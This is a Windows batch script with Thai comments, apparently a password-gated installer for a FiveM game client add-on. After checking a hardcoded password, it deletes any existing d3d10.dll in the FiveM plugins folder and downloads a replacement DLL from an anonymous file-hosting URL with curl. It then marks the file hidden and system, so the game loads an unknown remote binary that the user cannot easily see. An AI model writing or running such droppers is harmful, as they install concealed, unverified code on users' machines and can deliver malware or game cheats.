@echo off
setlocal enabledelayedexpansion

:: ตั้งรหัสผ่านที่ต้องการ
set "password=KuyAtomNahee"

:: ขอรหัสผ่านจากผู้ใช้ (ซ่อนการพิมพ์)
echo Password:
set "input="
for /f "delims=" %%i in (
    'powershell -Command "$p = Read-Host -AsSecureString; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($p))"'
) do set "input=%%i"

:: ตรวจสอบรหัสผ่าน
if "!input!" neq "!password!" (
    echo Error
    pause
    exit /b
)

set "plugin_dir=%LocalAppData%\FiveM\FiveM.app\plugins"
set "dll_file=!plugin_dir!\d3d10.dll"

if not exist "!plugin_dir!" mkdir "!plugin_dir!"

:: เช็คและลบไฟล์ d3d10.dll ถ้ามีอยู่
if exist "!dll_file!" (
    echo พบ d3d10.dll เดิม กำลังลบ...
    attrib -h -s "!dll_file!"
    del /f /q "!dll_file!"
)

:: โหลดไฟล์ใหม่
echo กำลังดาวน์โหลด d3d10.dll ใหม่...
curl --progress-bar -o "!dll_file!" "https://files.catbox.moe/1u0520.dll"

:: ซ่อนไฟล์และตั้งค่าเป็นไฟล์ระบบ
attrib +h +s "!dll_file!"

echo ดาวน์โหลดและตั้งค่าเสร็จสมบูรณ์
pause

